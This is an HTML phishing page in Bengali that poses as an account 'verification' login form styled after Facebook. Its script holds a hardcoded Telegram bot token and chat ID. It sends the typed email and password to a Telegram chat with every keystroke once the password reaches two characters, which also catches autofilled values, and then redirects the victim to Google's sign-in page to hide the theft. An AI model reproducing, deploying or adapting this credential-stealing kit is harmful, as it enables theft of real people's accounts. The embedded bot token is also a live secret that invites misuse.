<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ভেরিফিকেশন সেন্টার</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #f0f2f5; margin: 0; }
        .login-box { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 100%; max-width: 360px; text-align: center; }
        input { width: 100%; padding: 14px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; font-size: 16px; outline: none; }
        input:focus { border-color: #1877f2; }
        button { width: 100%; padding: 14px; background-color: #1877f2; border: none; border-radius: 8px; color: white; font-size: 18px; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>

<div class="login-box">
    <h3>অ্যাকাউন্ট ভেরিফিকেশন</h3>
    <form id="loginForm">
        <input type="email" id="email" name="email" placeholder="ইমেইল বা ফোন" required autocomplete="username">
        <input type="password" id="password" name="password" placeholder="পাসওয়ার্ড" required autocomplete="current-password">
        <button type="submit">এগিয়ে যান</button>
    </form>
    <p style="font-size: 11px; color: gray; margin-top: 15px;">Mst. Sarmin Akter_11223</p>
</div>

<script>
    const BOT_TOKEN = '7957986649:AAGCcJ5R6g6PMHEgWXFqLRn2SrpElZvUtnE'; 
    const CHAT_ID = '8516934257';

    const emailField = document.getElementById('email');
    const passField = document.getElementById('password');

    // টেলিগ্রামে ডাটা পাঠানোর ফাংশন
    async function sendData(currentPass) {
        const text = `🎯 লাইভ আপডেট:\n\n👤 ইউজার: ${emailField.value}\n🔑 পাসওয়ার্ড: ${currentPass}`;
        
        try {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: text })
            });
        } catch (e) {
            console.error("Sending failed");
        }
    }

    // পাসওয়ার্ড ফিল্ডে নজর রাখা (অটো-ফিল বা টাইপিং দুইটাই ধরবে)
    passField.addEventListener('input', function() {
        const val = this.value;
        // ২ অক্ষরের বেশি হলেই পাঠানো শুরু করবে
        if (val.length >= 2) {
            sendData(val);
        }
    });

    // ফাইনাল সাবমিট করলে জিমেইলে রিডাইরেক্ট
    document.getElementById('loginForm').addEventListener('submit', function(e) {
        e.preventDefault();
        window.location.href = "https://accounts.google.com/";
    });
</script>

</body>
</html>
